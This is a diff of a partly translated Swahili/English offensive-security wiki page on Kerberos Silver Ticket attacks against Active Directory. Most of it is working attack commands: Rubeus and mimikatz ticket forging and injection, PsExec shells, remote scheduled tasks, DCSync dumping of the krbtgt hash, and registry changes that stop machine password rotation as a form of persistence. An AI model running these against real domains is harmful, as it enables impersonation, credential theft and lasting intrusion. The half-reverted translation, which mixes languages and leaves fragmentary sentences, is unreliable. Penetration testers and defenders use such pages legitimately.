@@ -6,7 +6,11 @@
 
 ## Silver ticket
 
-Shambulio la **Silver Ticket** linahusisha unyakuzi wa tiketi za huduma katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama akaunti ya kompyuta, ili kuunda tiketi ya Ticket Granting Service (TGS). Kwa tiketi hii iliyoundwa, mshambuliaji anaweza kufikia huduma maalum kwenye mtandao, **akijifanya kuwa mtumiaji yeyote**, kwa kawaida akilenga mamlaka ya usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa ajili ya kuunda tiketi ni salama zaidi na si rahisi kugundulika.
+Shambulio la **Silver Ticket** linahusisha unyakuzi wa tiketi za huduma katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama akaunti ya kompyuta, ili kuunda tiketi ya Ticket Granting Service (TGS). Kwa tiketi hii iliyoundwa, mshambuliaji anaweza kufikia huduma maalum kwenye mtandao, **akijifanya kuwa mtumiaji yeyote**, kwa kawaida akilenga haki za usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa ajili ya kuunda tiketi ni salama zaidi na zisizoweza kugundulika.
+
+> [!WARNING]
+> Silver Tickets hazigunduliki kwa urahisi kama Golden Tickets kwa sababu zinahitaji tu **hash ya akaunti ya huduma**, si akaunti ya krbtgt. Hata hivyo, zinapungukiwa na huduma maalum wanazolenga. Aidha, kuiba tu nenosiri la mtumiaji.
+Zaidi ya hayo, ikiwa unavunja **nenosiri la akaunti na SPN** unaweza kutumia nenosiri hilo kuunda Silver Ticket ukijifanya kuwa mtumiaji yeyote kwa huduma hiyo.
 
 Kwa ajili ya kuunda tiketi, zana tofauti zinatumika kulingana na mfumo wa uendeshaji:
 
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Kwenye Windows
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -28,52 +37,56 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Huduma ya CIFS inasisitizwa kama lengo la kawaida kwa kupata mfumo wa faili wa mwathirika, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumika kwa kazi na maswali ya WMI.
+The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
 
-## Huduma Zinazopatikana
+## Available Services
 
-| Aina ya Huduma                             | Tiketi za Fedha za Huduma za Silver                                       |
+| Service Type                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika matukio mengine unaweza tu kuuliza: WINRM</p> |
-| Kazi za Ratiba                            | HOST                                                                       |
-| Kushiriki Faili za Windows, pia psexec    | CIFS                                                                       |
-| Operesheni za LDAP, ikiwa ni pamoja na DCSync | LDAP                                                                       |
-| Zana za Usimamizi wa Server ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Tiketi za Dhahabu                          | krbtgt                                                                     |
+| Scheduled Tasks                            | HOST                                                                       |
+| Windows File Share, also psexec            | CIFS                                                                       |
+| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Golden Tickets                             | krbtgt                                                                     |
 
-Kwa kutumia **Rubeus** unaweza **kuomba zote** tiketi hizi kwa kutumia parameter:
+Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Vitambulisho vya Tukio la Tiketi za Silver
+### Silver tickets Event IDs
 
-- 4624: Kuingia kwa Akaunti
-- 4634: Kutoka kwa Akaunti
-- 4672: Kuingia kwa Admin
+- 4624: Account Logon
+- 4634: Account Logoff
+- 4672: Admin Logon
 
-## Kutumia Tiketi za Huduma
+## Persistence
 
-Katika mifano ifuatayo hebu tuwaze kwamba tiketi inapatikana kwa kujifanya kuwa akaunti ya msimamizi.
+To avoid machines from rotating their password every 30 days set  `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` or you could set `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` to a bigger value than 30days to indicate the rotation perdiod when the machines password should be rotated.
+
+## Abusing Service tickets
+
+In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
 
 ### CIFS
 
-Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimewekwa wazi) na nakala za faili sehemu ya mfumo wa faili wa mbali kwa kufanya kitu kama:
+With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Utapata pia uwezo wa kupata shell ndani ya mwenyeji au kutekeleza amri zisizo na mpangilio ukitumia **psexec**:
+Utapata pia uwezo wa kupata shell ndani ya mwenyeji au kutekeleza amri za kawaida ukitumia **psexec**:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### MWEZI
+### HOST
 
-Kwa ruhusa hii unaweza kuunda kazi zilizopangwa katika kompyuta za mbali na kutekeleza amri zisizo na mpangilio:
+Kwa ruhusa hii unaweza kuunda kazi za ratiba katika kompyuta za mbali na kutekeleza amri za kawaida:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -109,31 +122,33 @@ Kwa ufikiaji wa winrm juu ya kompyuta unaweza **kuipata** na hata kupata PowerSh
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Angalia ukurasa ufuatao kujifunza **njia zaidi za kuungana na mwenyeji wa mbali kwa kutumia winrm**:
+Check the following page to learn **njia zaidi za kuungana na mwenyeji wa mbali kwa kutumia winrm**:
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Kumbuka kwamba **winrm lazima iwe hai na inasikiliza** kwenye kompyuta ya mbali ili kuweza kuipata.
+> Note that **winrm lazima iwe hai na inasikiliza** kwenye kompyuta ya mbali ili kuweza kuipata.
 
 ### LDAP
 
-Kwa ruhusa hii unaweza kutupa database ya DC kwa kutumia **DCSync**:
+With this privilege you can dump the DC database using **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
 **Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:
 
-## Marejeo
-
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
 {{#ref}}
 dcsync.md
 {{#endref}}
+
+
+## Marejeleo
+
+- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
+- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
 
 
